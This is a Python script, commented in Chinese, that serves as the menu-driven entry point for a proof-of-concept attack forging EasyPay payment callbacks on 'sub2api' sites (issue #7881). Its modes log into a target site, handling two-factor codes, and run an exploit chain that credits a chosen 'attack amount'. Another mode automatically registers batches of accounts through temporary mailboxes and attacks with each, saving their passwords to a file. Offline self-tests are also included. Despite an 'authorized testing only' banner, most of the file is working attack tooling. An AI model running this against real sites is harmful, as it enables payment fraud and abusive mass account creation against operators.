#!/usr/bin/env python3
"""
sub2api 易支付回调伪造 PoC 统一入口 (issue #7881)

合并三条线:
  1. 复现漏洞 —— 已有账号, 直接攻击
  2. 自动注册+攻击 —— 新账号, 自动注册并攻击
  3. 离线自检 —— 本地模拟服务端, 验证 PoC 逻辑
  4. 真实源码自检 —— 用真实 easypay.go 编译服务跑端到端

用法:
  python3 sub2api_poc.py              # 交互式菜单
  python3 sub2api_poc.py --menu       # 同上
  python3 sub2api_poc.py --attack --target https://site --email x@y.com  # 直接攻击
  python3 sub2api_poc.py --auto --target https://site --count 3          # 自动注册+攻击
  python3 sub2api_poc.py --selftest   # 离线自检
  python3 sub2api_poc.py --selftest-real  # 真实源码自检
"""

import argparse
import json
import os
import sys
import time

# 确保同目录模块可导入
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# 尝试导入, 失败时给出清晰提示
try:
    # 必须与 auto-register 引用同一个真实模块, 否则 ApiError 是两个类, except 捕获失败
    import poc_v3_attack_chain as poc
    import poc_v2_auto_register as reg
    assert reg.poc is poc, "两个文件的 poc 模块身份不一致, 异常捕获会失效"
except ImportError as e:
    print(f"[!] 缺少依赖模块: {e}")
    print("    请确保以下文件与本脚本同目录:")
    print("      - poc_v3_attack_chain.py")
    print("      - poc_v2_auto_register.py")
    sys.exit(1)


# ============================================================
#  交互式菜单
# ============================================================

def _w(text):
    """字符串显示宽度：CJK 与全角符号按 2 列算。"""
    import unicodedata
    return sum(2 if unicodedata.east_asian_width(c) in "WF" else 1 for c in text)


_MENU_ITEMS = [
    ("1", "复现漏洞", "已有账号 → 直接攻击"),
    ("2", "自动注册+攻击", "新账号 → 注册并攻击"),
    ("3", "离线自检", "本地模拟服务端，验证 PoC 逻辑"),
    ("4", "真实源码自检", "用真实 easypay.go 编译服务跑端到端"),
    ("5", "查看已保存账号", ""),
    ("6", "退出", ""),
]

_TITLE = "sub2api 易支付回调伪造 PoC  ·  issue #7881"
_W = 66


def _box():
    lines = []
    lines.append("╔" + "═" * _W + "╗")
    for t in (_TITLE, "⚠  仅限授权测试 · 禁止用于未授权系统"):
        pad = _W - _w(t)
        left = pad // 2
        lines.append("║" + " " * left + t + " " * (pad - left) + "║")
    lines.append("╟" + "─" * _W + "╢")
    for num, name, desc in _MENU_ITEMS:
        body = f"  {num})  {name}"
        if desc:
            body = body + "  — " + desc
        lines.append("║" + body + " " * (_W - _w(body)) + "║")
    lines.append("╚" + "═" * _W + "╝")
    return "\n".join(lines)


MENU_TEXT = _box()


def prompt(text, default="", hidden=False):
    """交互式输入。hidden=True 时不回显（用于密码）。EOF 时返回 default。"""
    if default:
        text = f"{text} [{default}]: "
    else:
        text = text + ": "
    try:
        if hidden:
            import getpass
            return getpass.getpass(text)
        return input(text).strip() or default
    except (EOFError, KeyboardInterrupt):
        print()
        raise SystemExit(0)


def confirm(text, default=False):
    """Y/N 确认。"""
    yn = "Y/n" if default else "y/N"
    try:
        r = input(f"{text} [{yn}]: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return False
    if not r:
        return default
    return r in ("y", "yes")


def _wait_enter():
    """等用户按回车；EOF 时直接返回，避免非交互环境下崩溃。"""
    try:
        input("\n按回车返回菜单...")
    except (EOFError, KeyboardInterrupt):
        print()


def print_header(title):
    print(f"\n{'='*64}")
    print(f"  {title}")
    print(f"{'='*64}\n")


def show_saved_accounts():
    """查看已保存账号。"""
    print_header("已保存账号")
    records = reg.load_records(reg.SAVE_FILE)
    if not records:
        print("  (无)")
        _wait_enter()
        return
    for i, r in enumerate(records, 1):
        print(f"  [{i}] {r.get('email', '?')}")
        print(f"       密码: {r.get('password', '?')}")
        print(f"       状态: {r.get('verdict', '?')}")
        print(f"       保存于: {r.get('saved_at', '?')}")
        print()
    _wait_enter()


def run_attack_flow(target, email, password, amount, method, yes, plain, verbose, timeout):
    """路径 1: 已有账号 → 直接攻击。"""
    print_header("路径 1: 复现漏洞（已有账号 → 直接攻击）")

    if not target:
        target = prompt("目标站点 URL")
    if not target:
        print("  [!] 必须提供目标站点")
        return

    if not email:
        email = prompt("登录邮箱")
    if not email:
        print("  [!] 必须提供邮箱")
        return

    if not password:
        password = prompt("登录密码", hidden=True)
    if not password:
        print("  [!] 必须提供密码")
        return

    if amount is None:
        amt = prompt("攻击金额", default="10.00")
        try:
            amount = float(amt)
        except ValueError:
            print("  [!] 金额格式不对, 使用 10.00")
            amount = 10.00

    ui = poc.UI(plain=plain, verbose=verbose)
    client = poc.Sub2ApiClient(target, timeout=timeout, insecure=False)

    # 登录。client.login() 返回值里可能带 requires_2fa（code 仍为 0）
    try:
        data = client.login(email, password) or {}
    except poc.ApiError as e:
        ui.fail(f"登录失败: {e}")
        return

    if data.get("requires_2fa"):
        temp = data.get("temp_token") or ""
        masked = data.get("user_email_masked") or email
        ui.warn(f"该账户启用了两步验证 ({masked})")
        code = prompt("6 位验证码", hidden=True)
        if not (code or "").isdigit() or len(code) != 6:
            ui.fail("验证码格式不对 (应为 6 位数字)")
            return
        try:
            data = client.login_2fa(temp, code) or {}
        except poc.ApiError as e:
            ui.fail(f"两步验证失败: {e}")
            return
        ui.ok("两步验证通过")

    if not data.get("access_token"):
        ui.fail("登录响应中没有 access_token")
        return
    client.token = data["access_token"]
    ui.ok(f"登录成功: {email}")

    # 探测支付通道
    info = poc.get_checkout_info(client, ui)
    methods = poc.pick_methods(argparse.Namespace(method=method), info)
    ui.info(f"将尝试支付通道: {', '.join(methods)}")

    # 执行攻击链
    result, evidence = poc.run_exploit(client, ui, amount, methods)
    ui.verdict(result, evidence)

    # 保存凭据
    reg.save_record(reg.SAVE_FILE, {
        "email": email, "password": password,
        "target": target, "verdict": result, "evidence": evidence,
    })

    _wait_enter()


def run_auto_register_flow(target, email, domain, email_provider, email_timeout,
                            password, invitation_code, amount, count, method,
                            no_save, yes, plain, verbose, timeout):
    """路径 2: 自动注册+攻击。"""
    print_header("路径 2: 自动注册+攻击（新账号 → 注册并攻击）")

    if not target:
        target = prompt("目标站点 URL")
    if not target:
        print("  [!] 必须提供目标站点")
        return

    if amount is None:
        amt = prompt("攻击金额", default="10.00")
        try:
            amount = float(amt)
        except ValueError:
            amount = 10.00

    if count is None:
        cnt = prompt("账号数量", default="1")
        try:
            count = int(cnt)
        except ValueError:
            count = 1

    ui = poc.UI(plain=plain, verbose=verbose)
    client = poc.Sub2ApiClient(target, timeout=timeout, insecure=False)

    args = argparse.Namespace(
        target=target, email=email, domain=domain,
        email_provider=email_provider, email_timeout=email_timeout,
        password=password, invitation_code=invitation_code,
        use_existing=False, amount=amount, count=count, method=method,
        no_save=no_save, yes=yes, plain=plain, verbose=verbose,
        timeout=timeout,
    )

    count = max(int(count or 1), 1)
    ui.show_kv([
        ("目标", target),
        ("账号数量", count),
        ("充值金额", f"{amount:.2f}"),
        ("邮箱", email or f"随机 *@{domain}"),
        ("支付通道", method or "自动探测"),
    ], title="任务配置")

    if not yes and not ui.confirm("确认对该目标执行 注册+完整攻击链? (必须是你的站点或已获授权)"):
        ui.warn("已取消。")
        return

    done = skipped = 0
    for i in range(count):
        if count > 1:
            ui._c(f"\n===== 账号 {i+1}/{count} =====", "magenta")
        if email and i == 0:
            acct_email = email
        else:
            acct_email = reg.generate_mailbox(email_provider, domain)
            if not acct_email:
                ui.fail(f"{email_provider} 申请邮箱失败")
                return
        acct_pw = password or reg.rand_password()
        ui.info(f"使用邮箱: {acct_email}")
        try:
            status, result = reg.run_one(client, ui, args, acct_email, acct_pw, amount)
        except KeyboardInterrupt:
            ui.warn("\n用户中断。")
            return
        except poc.ApiError as e:
            ui.fail(f"流程中断: {e}")
            return

        if status == reg.R_OK:
            done += 1
            if not no_save:
                reg.save_record(reg.SAVE_FILE, {
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "target": target, "email": acct_email, "password": acct_pw,
                    "amount": amount, "verdict": result,
                })
                ui.info(f"凭据已追加保存到 {reg.SAVE_FILE}")
        elif status == reg.R_EXISTS:
            ui.warn("该邮箱已被注册, 换号重试")
            skipped += 1
        elif status == reg.R_VERIFY:
            skipped += 1
        else:
            ui.fail("遇到无法自动处理的问题, 中止")
            return

    ui.show_kv([("完成测试", done), ("跳过", skipped), ("总数", count)], title="汇总")
    if done == 0:
        ui.warn("未执行任何漏洞测试。")

    _wait_enter()


def run_selftest(plain, verbose):
    """路径 3: 离线自检。"""
    print_header("路径 3: 离线自检（本地模拟服务端）")
    ui = poc.UI(plain=plain, verbose=verbose)
    poc.run_selftest(ui)
    _wait_enter()


def run_selftest_real(plain, verbose):
    """路径 4: 真实源码自检。"""
    print_header("路径 4: 真实源码自检（用真实 easypay.go）")
    ui = poc.UI(plain=plain, verbose=verbose)
    poc.run_selftest_real(ui)
    _wait_enter()


# ============================================================
#  主菜单循环
# ============================================================

def main_menu():
    """交互式主菜单。"""
    # 默认参数（CLI 传入的会覆盖）
    target = None
    email = None
    password = None
    amount = None
    method = None
    domain = "gmail.com"
    email_provider = "auto"
    email_timeout = 60
    invitation_code = None
    count = None
    no_save = False
    plain = False
    verbose = False
    timeout = 30
    yes = False

    while True:
        try:
            os.system("clear" if os.name == "posix" else "cls")
            print(MENU_TEXT)
            choice = input("  请选择 [1-6]: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  已退出。\n")
            break

        if choice == "1":
            run_attack_flow(target, email, password, amount, method,
                           yes, plain, verbose, timeout)
        elif choice == "2":
            run_auto_register_flow(target, email, domain, email_provider,
                                   email_timeout, password, invitation_code,
                                   amount, count, method, no_save,
                                   yes, plain, verbose, timeout)
        elif choice == "3":
            run_selftest(plain, verbose)
        elif choice == "4":
            run_selftest_real(plain, verbose)
        elif choice == "5":
            show_saved_accounts()
        elif choice == "6":
            print("\n  再见。\n")
            break
        elif choice:
            print("  [!] 无效选择, 请输入 1-6\n")
        # 空行(管道输入残留)静默忽略, 不刷屏
            time.sleep(1)


# ============================================================
#  CLI 入口
# ============================================================

def parse_args():
    ap = argparse.ArgumentParser(
        description="sub2api 易支付回调伪造 PoC 统一入口 (issue #7881)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  %(prog)s                          # 交互式菜单
  %(prog)s --attack --target https://site --email x@y.com
  %(prog)s --auto --target https://site --count 3
  %(prog)s --selftest               # 离线自检
  %(prog)s --selftest-real          # 真实源码自检 (需 Go)
        """,
    )
    ap.add_argument("--menu", action="store_true", help="显式进入交互式菜单")
    ap.add_argument("--attack", action="store_true", help="路径 1: 已有账号 → 直接攻击")
    ap.add_argument("--auto", action="store_true", help="路径 2: 自动注册+攻击")
    ap.add_argument("--selftest", action="store_true", help="路径 3: 离线自检")
    ap.add_argument("--selftest-real", action="store_true", help="路径 4: 真实源码自检")
    ap.add_argument("--accounts", action="store_true", help="查看已保存账号")

    # 共享参数
    ap.add_argument("--target", help="目标站点 URL")
    ap.add_argument("--email", help="邮箱")
    ap.add_argument("--password", help="密码")
    ap.add_argument("--amount", type=float, help="攻击金额")
    ap.add_argument("--method", help="指定 payment_type")
    ap.add_argument("--domain", default="gmail.com", help="随机邮箱域名")
    ap.add_argument("--email-provider", choices=["auto", "tempmail", "emailmux"],
                    default="auto", help="临时邮箱服务")
    ap.add_argument("--email-timeout", type=int, default=60, help="取码超时秒数")
    ap.add_argument("--invitation-code", help="邀请码")
    ap.add_argument("--count", type=int, help="账号数量 (自动注册模式)")
    ap.add_argument("--no-save", action="store_true", help="不保存账号凭据")
    ap.add_argument("--insecure", action="store_true", help="跳过 TLS 校验")
    ap.add_argument("--plain", action="store_true", help="禁用 rich")
    ap.add_argument("--yes", action="store_true", help="跳过确认")
    ap.add_argument("--timeout", type=int, default=30, help="HTTP 超时秒数")
    ap.add_argument("--verbose", "-v", action="store_true", help="打印原始报文")
    return ap.parse_args()


def main():
    args = parse_args()

    # 无参数或显式 --menu → 交互式菜单
    if not any([args.menu, args.attack, args.auto, args.selftest,
                args.selftest_real, args.accounts]):
        main_menu()
        return

    ui = poc.UI(plain=args.plain, verbose=args.verbose)

    if args.accounts:
        records = reg.load_records(reg.SAVE_FILE)
        if not records:
            ui.warn("(无)")
        for r in records:
            ui.info(f"{r.get('email')}  |  {r.get('verdict')}  |  {r.get('saved_at', '')}")
        return

    if args.selftest:
        poc.run_selftest(ui)
        return

    if args.selftest_real:
        poc.run_selftest_real(ui)
        return

    if args.attack:
        client = poc.Sub2ApiClient(args.target, timeout=args.timeout,
                                   insecure=args.insecure)
        data = client.login(args.email, args.password)
        ui.ok(f"登录成功: {args.email}")
        info = poc.get_checkout_info(client, ui)
        methods = poc.pick_methods(argparse.Namespace(method=args.method), info)
        result, evidence = poc.run_exploit(client, ui, args.amount or 10.00, methods)
        ui.verdict(result, evidence)
        return

    if args.auto:
        run_auto_register_flow(
            args.target, args.email, args.domain, args.email_provider,
            args.email_timeout, args.password, args.invitation_code,
            args.amount if args.amount is not None else 10.00, args.count,
            args.method, args.no_save, args.yes, args.plain, args.verbose,
            args.timeout,
        )
        return


if __name__ == "__main__":
    main()